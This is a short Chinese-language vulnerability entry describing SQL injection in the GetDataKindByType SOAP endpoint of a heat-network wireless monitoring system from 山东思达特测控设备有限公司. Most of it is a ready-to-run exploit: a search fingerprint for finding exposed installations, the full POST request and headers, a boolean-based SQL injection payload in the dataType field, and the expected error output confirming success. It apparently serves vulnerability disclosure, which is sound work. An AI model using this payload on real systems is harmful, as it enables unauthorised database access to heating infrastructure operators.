# 山东思达特测控设备有限公司热网无线监测系统GetDataKindByType存在SQL注入漏洞

- **系统**：山东思达特测控设备有限公司热网无线监测系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Downloads/HDPrintInstall.rar"`
- **请求**：`POST /DataSrvs/UCCGSrv.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=etxlbzrbmcecvsuy1fwjnfzy`　`Priority: u=1`　`SOAPAction: [http://tempuri.org/GetDataKindByType](http://tempuri.org/GetDataKindByType)`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 478`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetDataKindByType>
<!--type: string-->
<tem:dataType>(SELECT CHAR(113)+CHAR(106)+CHAR(98)+CHAR(112)+CHAR(113)+(CASE WHEN (2832=2832) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(107)+CHAR(113))</tem:dataType>
</tem:GetDataKindByType>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：500　|　qjbpq1qzjkq
Data.SqlClient.SqlException